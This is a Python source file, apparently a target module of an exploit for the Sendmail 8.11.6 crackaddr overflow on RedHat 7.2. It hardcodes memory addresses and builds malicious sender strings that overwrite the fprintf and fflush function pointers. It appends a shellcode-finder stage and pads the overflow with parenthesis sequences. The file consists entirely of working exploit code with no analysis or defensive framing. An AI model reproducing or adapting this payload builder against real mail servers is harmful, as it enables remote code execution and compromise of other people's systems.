import senders
import finder
import utils

class rh72(senders.senders):
   version = "RH72"
   details = "RedHat 7.2 running Sendmail 8.11.6"
   banner = "ESMTP Sendmail 8.11.6/8.11.6"
   crackaddrBufLocation = 0x80c3580L
   mciCacheLocation = 0x80c3880L

   def buildSender1(self, len):
      # offset addresses by 0x20 bytes from what's in senders.senders
      # to avoid bad bytes all over the place.
      body = ""
      for i in range(len / 4):
         body += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x20)
      if (utils.bufHasBadBytes(body, self.badBytes)):
         print "sender1 has bad bytes"
         return None
      return body

   def buildSender2(self, finderValue):
      # offset addresses by 0x20 bytes from what's in senders.senders
      # to avoid bad bytes all over the place.
      finder.data = finderValue

      filler = utils.buildBuffer(0xf9, self.badBytes)
      sender2 = "(" + filler[0x1:0x4]
      sender2 += filler[0x4:0x24]	# pad with 0x20 bytes of random
      for i in range(0x24, 0x54, 4):
         sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x20)
      sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x6c)
      for i in range(0x58, 0x64, 4):
         sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x20)
      sender2 += filler[0x64:0x66]
      sender2 += chr(0xa0)
      sender2 += filler[0x67:0x88]
      # 0x88 - 0x8c -- overwrite (v)fprintf ptr (crackaddrBufLoc + 0x6c + 0x1c)
      sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0xa0)
      sender2 += filler[0x8c:0x9c]
      # 0x9c - 0xa0 -- overwrite fflush ptr (crackaddrBufLoc + 0x6c + 0x30)
      sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0xa0)
      # 0xa0 - ?
      sender2 += finder.build()
      sender2 += filler[len(sender2):]
      sender2 += ")"

      if (utils.bufHasBadBytes(sender2[1:-1], self.badBytes)):
         print "sender2 has bad bytes"
         utils.dumpHex(sender2)
         return None

      nparens = (self.mciCacheLocation - self.crackaddrBufLocation) \
                - len(sender2)
      for i in range(nparens):
         sender2 += "()>"

      return sender2
